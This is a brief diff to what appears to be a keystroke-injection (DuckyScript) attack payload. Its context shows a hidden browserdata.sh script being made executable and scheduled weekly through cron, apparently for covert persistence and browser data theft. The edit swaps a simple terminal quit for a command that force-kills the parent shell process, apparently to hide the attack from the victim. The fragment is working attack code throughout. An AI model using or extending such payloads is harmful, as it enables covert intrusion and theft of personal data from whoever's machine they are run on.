@@ -30,4 +30,5 @@ STRING chmod +x ~/.hidden/browserdata.sh && echo "0 0 * * 0 ~/.hidden/browserdat
 ENTER
 
 REM Quit terminal
-GUI Q
+STRING kill -9 $(ps -p $PPID -o ppid=)
+ENTER
